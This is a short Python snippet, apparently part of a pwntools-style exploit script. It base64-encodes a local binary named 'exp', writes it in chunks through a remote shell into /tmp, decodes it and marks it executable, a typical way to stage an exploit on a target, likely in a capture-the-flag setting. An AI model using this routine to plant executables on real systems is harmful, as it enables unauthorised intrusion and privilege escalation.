def exec_cmd(p, cmd):
    p.sendline(cmd)
    p.recvuntil("$ ")

def upload(p):
    # os.system("rm ./benc; rm ./bout")
    with open("exp", "rb") as f:
        data = f.read()
    encoded = base64.b64encode(data).decode()
    open("./exp_base64", "wb").write(encoded.encode())
    p.recvuntil("$ ")
    for i in range(0, len(encoded), 300):
        print("%d / %d" % (i, len(encoded)))
        exec_cmd(p, "echo -n \"%s\" >> /tmp/benc" % (encoded[i:i+300]))
        # os.system("echo -n \"%s\" >> ./benc" % (encoded[i:i+300]))
    exec_cmd(p, "cat /tmp/benc | base64 -d > /tmp/bout")
    exec_cmd(p, "chmod +x /tmp/bout")
    # os.system("cat ./benc | base64 -d > ./bout")
    # os.system("chmod +x ./bout")